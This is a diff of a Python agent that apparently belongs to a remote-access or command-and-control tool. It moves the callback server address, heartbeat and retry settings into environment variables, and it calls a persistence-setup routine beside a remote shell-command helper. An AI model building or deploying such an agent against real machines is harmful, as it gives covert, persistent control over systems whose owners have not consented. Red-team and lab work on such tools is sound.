@@ -2,26 +2,26 @@ import os
 import sys
 import socket
 import time
+from dotenv import load_dotenv
 from data import get_system_info
 from shell import run_command
 from helper import send_json, receive_json
 from persistence import setup_persistence
 
+load_dotenv("../.env")
 
 if len(sys.argv) < 2:
-    SERVER_HOST = "192.168.10.150"
-    SERVER_PORT = 8080
+    SERVER_HOST = os.getenv("SERVER_HOST")
+    SERVER_PORT = int(os.getenv("SERVER_PORT"))
 else:
     SERVER_HOST = sys.argv[1]
     SERVER_PORT = int(sys.argv[2])
 
-BUFFER_SIZE = 1024
+MAX_TIMEOUT = int(os.getenv("AGENT_SEND_HEARTBEAT_INTERVAL"))  # Send heartbeat interval.
+RETRY_CONNECT_INTERVAL = int(os.getenv("AGENT_RETRY_CONNECTION_INTERVAL"))  # Retry connection interval.
 
 EXE_LOCATION, AGENT_ID_LOCATION = setup_persistence()  # Setup persistence and return exe and agent ID locations.
-print(EXE_LOCATION)
-print(AGENT_ID_LOCATION)
-MAX_TIMEOUT = 180  # Send heartbeat interval.
-RETRY_CONNECT_INTERVAL = 60  # Retry connection interval.
+
 
 def read_uuid() -> str | None:
 
